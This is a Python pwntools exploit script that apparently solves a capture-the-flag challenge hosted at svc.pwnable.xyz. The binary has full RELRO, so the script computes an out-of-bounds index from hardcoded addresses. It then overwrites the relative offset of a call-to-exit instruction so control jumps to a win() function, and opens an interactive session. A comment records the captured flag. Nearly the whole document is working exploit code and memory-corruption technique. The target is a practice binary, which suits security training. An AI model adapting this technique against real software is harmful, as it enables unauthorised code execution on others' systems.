from pwn import *

# Because full relro is activated, we cannot overwrite the global offset table
# Instead, we need to overwrite specific instructions in the program
def main():
    LOCAL = False
    if LOCAL:
        elf = ELF('./challenge')
        r = elf.process()
    else:
        r = remote('svc.pwnable.xyz', 30029)

    r.recvuntil("💩   ")

    # Result + z * 8 gives me the address of exit instruction
    call_exit_addr = 0x0000555555400ac8 # <-- the location of the instruction i want to overwrite
    got_result_addr = 0x0000555555602200 # <-- the address of the result pointer
    z = (call_exit_addr - got_result_addr) // 8 # <-- the value I need to send for z
    z = -262887
    
    print(z)

    # Replace the value at call_exit_addr with the correct offset value to get to the win() function
    # The program is using rip relative addressing
    # 0xfffffd63 (represents the offset) 
    exit_addr = 0x0000555555400830 # <-- the location of the instruction i want to overwrite
    win_addr = 0x0000555555400a21 # <-- location of win_addr
    instruction_size = 0x5 # size of the instruction
    offset = (call_exit_addr - win_addr + instruction_size) * -1 # <-- -172
    offset = 0xffffff54e8 # -172 as an unsigned long which is 64 bits
    print(offset)
    offset ^= 1
    
    payload = str(offset) + " 1 " + str(z)
    print(payload)
    r.sendline(payload)
    l = r.recvline()
    print(l)

    r.recvuntil("💩   ")
    r.sendline("a")
    r.interactive()
    # Flag: FLAG{how_did_text_happen_to_be_rwx}
    

if __name__ == '__main__':
    main()
